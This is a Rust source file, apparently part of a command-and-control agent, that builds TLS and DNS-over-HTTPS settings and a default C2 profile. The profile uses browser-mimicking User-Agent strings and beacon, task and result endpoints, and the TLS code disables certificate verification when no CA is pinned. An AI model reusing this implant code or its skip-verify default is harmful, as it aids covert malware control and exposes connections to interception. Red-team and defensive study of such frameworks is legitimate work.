//! TLS and DoH configuration construction.
//!
//! Ports `BuildTLSConfig`, `BuildDoHTLSConfig`, and `defaultProfile`.
//! `tls.Config` in Go maps to `crate::tlsfp::client::TlsParams` in
//! Rust — the caller passes the params to `new_http_client`, which
//! builds the actual `reqwest::Client`.

use base64::{engine::general_purpose::STANDARD, Engine as _};

use crate::protocol::Profile;
use crate::tlsfp::client::TlsParams;

use super::agent::{AgentError, Config};

/// Build the standard TLS params for the HTTP transport.
///
/// Sets `insecure_skip_verify` when no CA is configured (matching
/// the Go tree — an agent with no CA pinned accepts any cert), or
/// pins the supplied CA otherwise. Client cert and key are loaded
/// when both are present.
pub fn build_tls_config(cfg: &Config) -> Result<TlsParams, AgentError> {
    let mut params = TlsParams::default();

    if !cfg.root_ca_pem_b64.is_empty() {
        match STANDARD.decode(&cfg.root_ca_pem_b64) {
            Ok(pem) => {
                params.root_ca = Some(pem);
            }
            Err(e) => {
                return Err(AgentError::Tls(format!(
                    "RootCAPem b64: {e}"
                )));
            }
        }
    } else {
        // Go tree: no CA → InsecureSkipVerify.
        params.insecure_skip_verify = true;
    }

    if !cfg.client_cert_pem_b64.is_empty()
        && !cfg.client_key_pem_b64.is_empty()
    {
        let cert = STANDARD
            .decode(&cfg.client_cert_pem_b64)
            .map_err(|e| {
                AgentError::Tls(format!("client cert b64: {e}"))
            })?;
        let key = STANDARD
            .decode(&cfg.client_key_pem_b64)
            .map_err(|e| {
                AgentError::Tls(format!("client key b64: {e}"))
            })?;
        params.client_cert_pem = Some(cert);
        params.client_key_pem = Some(key);
    }

    params.min_tls_version = Some(reqwest::tls::Version::TLS_1_2);
    Ok(params)
}

/// Build the DoH TLS params. No mTLS, no CA pin — the DoH
/// transport talks to a public resolver.
pub fn build_doh_tls_config(_cfg: &Config) -> Result<TlsParams, AgentError> {
    let mut params = TlsParams::default();
    params.min_tls_version = Some(reqwest::tls::Version::TLS_1_2);
    Ok(params)
}

/// The framework's default C2 profile.
pub fn default_profile() -> Profile {
    let ua = match std::env::consts::OS {
        "linux" => "Mozilla/5.0 (X11; Linux x86_64)",
        "macos" => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        _ => "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    };
    Profile {
        user_agent: ua.to_string(),
        beacon_path: "/beacon".to_string(),
        tasks_path: "/tasks".to_string(),
        results_path: "/results".to_string(),
        extra_headers: Default::default(),
        request_headers: Default::default(),
        ..Default::default()
    }
}